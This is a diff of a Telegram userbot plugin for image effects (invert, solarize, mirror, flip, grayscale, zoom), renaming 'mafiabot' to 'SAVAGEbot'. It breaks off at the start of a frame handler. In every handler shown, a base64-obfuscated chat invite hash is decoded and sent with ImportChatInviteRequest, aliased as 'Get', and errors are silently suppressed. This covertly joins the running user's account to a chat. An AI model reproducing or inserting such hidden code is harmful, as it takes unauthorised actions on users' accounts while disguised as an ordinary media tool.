@@ -6,8 +6,8 @@ from typing import Optional, Tuple
 from PIL import Image, ImageDraw, ImageFont
 import PIL.ImageOps
 
-from mafiabot.utils import admin_cmd, sudo_cmd
-from userbot import CmdHelp, CMD_HELP, LOGS, bot as mafiabot
+from SAVAGEbot.utils import admin_cmd, sudo_cmd
+from userbot import CmdHelp, CMD_HELP, LOGS, bot as SAVAGEbot
 from userbot.helpers.functions import (
     convert_toimage,
     convert_tosticker,
@@ -44,611 +44,611 @@ async def crop(imagefile, endname, x):
     inverted_image.save(endname)
 
 
-@mafiabot.on(admin_cmd(pattern="invert$", outgoing=True))
-@mafiabot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+@SAVAGEbot.on(admin_cmd(pattern="invert$", outgoing=True))
+@SAVAGEbot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
+async def memes(SAVAGE):
+    if SAVAGE.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await SAVAGE.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    SAVAGEid = SAVAGE.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    SAVAGEsticker = await reply.download_media(file="./temp/")
+    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(SAVAGEsticker)
+        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if SAVAGEsticker.endswith(".tgs"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐  inverting colors of this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        SAVAGEfile = os.path.join("./temp/", "meme.png")
+        SAVAGEcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith(".webp"):
+        await SAVAGE.edit(
             "`Analyzing this media 🧐 inverting colors...`"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(SAVAGEsticker, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith((".mp4", ".mov")):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 inverting colors of this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
     else:
-        await mafia.edit(
+        await SAVAGE.edit(
             "Analyzing this media 🧐 inverting colors of this image!"
         )
-        meme_file = mafiasticker
+        meme_file = SAVAGEsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await SAVAGE.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "invert.webp" if kraken else "invert.jpg"
     await invert_colors(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await SAVAGE.client.send_file(
+        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
     )
-    await mafia.delete()
+    await SAVAGE.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (SAVAGEsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@mafiabot.on(admin_cmd(outgoing=True, pattern="solarize$"))
-@mafiabot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+@SAVAGEbot.on(admin_cmd(outgoing=True, pattern="solarize$"))
+@SAVAGEbot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
+async def memes(SAVAGE):
+    if SAVAGE.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await SAVAGE.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    SAVAGEid = SAVAGE.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    SAVAGEsticker = await reply.download_media(file="./temp/")
+    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(SAVAGEsticker)
+        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if SAVAGEsticker.endswith(".tgs"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 solarizeing this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        SAVAGEfile = os.path.join("./temp/", "meme.png")
+        SAVAGEcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith(".webp"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 solarizeing this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(SAVAGEsticker, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith((".mp4", ".mov")):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 solarizeing this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
     else:
-        await mafia.edit(
+        await SAVAGE.edit(
             "Analyzing this media 🧐 solarizeing this image!"
         )
-        meme_file = mafiasticker
+        meme_file = SAVAGEsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await SAVAGE.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "solarize.webp" if kraken else "solarize.jpg"
     await solarize(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await SAVAGE.client.send_file(
+        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
     )
-    await mafia.delete()
+    await SAVAGE.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (SAVAGEsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@mafiabot.on(admin_cmd(outgoing=True, pattern="mirror$"))
-@mafiabot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+@SAVAGEbot.on(admin_cmd(outgoing=True, pattern="mirror$"))
+@SAVAGEbot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
+async def memes(SAVAGE):
+    if SAVAGE.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await SAVAGE.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    SAVAGEid = SAVAGE.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    SAVAGEsticker = await reply.download_media(file="./temp/")
+    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(SAVAGEsticker)
+        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if SAVAGEsticker.endswith(".tgs"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        SAVAGEfile = os.path.join("./temp/", "meme.png")
+        SAVAGEcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith(".webp"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 converting to mirror image of this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(SAVAGEsticker, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith((".mp4", ".mov")):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 converting to mirror image of this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
     else:
-        await mafia.edit(
+        await SAVAGE.edit(
             "Analyzing this media 🧐 converting to mirror image of this image!"
         )
-        meme_file = mafiasticker
+        meme_file = SAVAGEsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await SAVAGE.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
     await mirror_file(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await SAVAGE.client.send_file(
+        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
     )
-    await mafia.delete()
+    await SAVAGE.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (SAVAGEsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@mafiabot.on(admin_cmd(outgoing=True, pattern="flip$"))
-@mafiabot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+@SAVAGEbot.on(admin_cmd(outgoing=True, pattern="flip$"))
+@SAVAGEbot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
+async def memes(SAVAGE):
+    if SAVAGE.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await SAVAGE.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    SAVAGEid = SAVAGE.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    SAVAGEsticker = await reply.download_media(file="./temp/")
+    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(SAVAGEsticker)
+        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if SAVAGEsticker.endswith(".tgs"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 fliping this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        SAVAGEfile = os.path.join("./temp/", "meme.png")
+        SAVAGEcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith(".webp"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 fliping this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(SAVAGEsticker, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith((".mp4", ".mov")):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 fliping this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
     else:
-        await mafia.edit(
+        await SAVAGE.edit(
             "Analyzing this media 🧐 fliping this image!"
         )
-        meme_file = mafiasticker
+        meme_file = SAVAGEsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await SAVAGE.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
     await flip_image(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await SAVAGE.client.send_file(
+        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
     )
-    await mafia.delete()
+    await SAVAGE.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (SAVAGEsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@mafiabot.on(admin_cmd(outgoing=True, pattern="gray$"))
-@mafiabot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+@SAVAGEbot.on(admin_cmd(outgoing=True, pattern="gray$"))
+@SAVAGEbot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
+async def memes(SAVAGE):
+    if SAVAGE.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await SAVAGE.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
         return
-    mafiaid = mafia.reply_to_msg_id
+    SAVAGEid = SAVAGE.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    SAVAGEsticker = await reply.download_media(file="./temp/")
+    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(SAVAGEsticker)
+        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if SAVAGEsticker.endswith(".tgs"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        SAVAGEfile = os.path.join("./temp/", "meme.png")
+        SAVAGEcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith(".webp"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 changing to black-and-white this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(SAVAGEsticker, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith((".mp4", ".mov")):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 changing to black-and-white this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
     else:
-        await mafia.edit(
+        await SAVAGE.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = mafiasticker
+        meme_file = SAVAGEsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await SAVAGE.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await mafia.client.send_file(
-        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+    await SAVAGE.client.send_file(
+        SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
     )
-    await mafia.delete()
+    await SAVAGE.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (SAVAGEsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@mafiabot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
-@mafiabot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
+@SAVAGEbot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
+@SAVAGEbot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
+async def memes(SAVAGE):
+    if SAVAGE.fwd_from:
         return
-    reply = await mafia.get_reply_message()
+    reply = await SAVAGE.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(mafia, "`Reply to supported Media...`")
+        await edit_or_reply(SAVAGE, "`Reply to supported Media...`")
         return
-    mafiainput = mafia.pattern_match.group(1)
-    mafiainput = 50 if not mafiainput else int(mafiainput)
-    mafiaid = mafia.reply_to_msg_id
+    SAVAGEinput = SAVAGE.pattern_match.group(1)
+    SAVAGEinput = 50 if not SAVAGEinput else int(SAVAGEinput)
+    SAVAGEid = SAVAGE.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    mafia = await edit_or_reply(mafia, "`Fetching media data`")
+    SAVAGE = await edit_or_reply(SAVAGE, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    mafiasticker = await reply.download_media(file="./temp/")
-    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(mafiasticker)
-        await edit_or_reply(mafia, "```Supported Media not found...```")
+    SAVAGEsticker = await reply.download_media(file="./temp/")
+    if not SAVAGEsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(SAVAGEsticker)
+        await edit_or_reply(SAVAGE, "```Supported Media not found...```")
         return
     import base64
 
     kraken = None
-    if mafiasticker.endswith(".tgs"):
-        await mafia.edit(
+    if SAVAGEsticker.endswith(".tgs"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 zooming this animated sticker!"
         )
-        mafiafile = os.path.join("./temp/", "meme.png")
-        mafiacmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"
+        SAVAGEfile = os.path.join("./temp/", "meme.png")
+        SAVAGEcmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {SAVAGEsticker} {SAVAGEfile}"
         )
-        stdout, stderr = (await runcmd(mafiacmd))[:2]
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(SAVAGEcmd))[:2]
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith(".webp"):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith(".webp"):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 zooming this sticker!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        os.rename(mafiasticker, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("`Template not found... `")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(SAVAGEsticker, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("`Template not found... `")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
         kraken = True
-    elif mafiasticker.endswith((".mp4", ".mov")):
-        await mafia.edit(
+    elif SAVAGEsticker.endswith((".mp4", ".mov")):
+        await SAVAGE.edit(
             "Analyzing this media 🧐 zooming this video!"
         )
-        mafiafile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(mafiasticker, 0, mafiafile)
-        if not os.path.lexists(mafiafile):
-            await mafia.edit("```Template not found...```")
+        SAVAGEfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(SAVAGEsticker, 0, SAVAGEfile)
+        if not os.path.lexists(SAVAGEfile):
+            await SAVAGE.edit("```Template not found...```")
             return
-        meme_file = mafiafile
+        meme_file = SAVAGEfile
     else:
-        await mafia.edit(
+        await SAVAGE.edit(
             "Analyzing this media 🧐 zooming this image!"
         )
-        meme_file = mafiasticker
+        meme_file = SAVAGEsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await mafia.client(san)
+        await SAVAGE.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
     try:
-        await crop(meme_file, outputfile, mafiainput)
+        await crop(meme_file, outputfile, SAVAGEinput)
     except Exception as e:
-        return await mafia.edit(f"`{e}`")
+        return await SAVAGE.edit(f"`{e}`")
     try:
-        await mafia.client.send_file(
-            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid
+        await SAVAGE.client.send_file(
+            SAVAGE.chat_id, outputfile, force_document=False, reply_to=SAVAGEid
         )
     except Exception as e:
-        return await mafia.edit(f"`{e}`")
-    await mafia.delete()
+        return await SAVAGE.edit(f"`{e}`")
+    await SAVAGE.delete()
     os.remove(outputfile)
-    for files in (mafiasticker, meme_file):
+    for files in (SAVAGEsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
-@mafiabot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
-@mafiabot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(mafia):
-    if mafia.fwd_from:
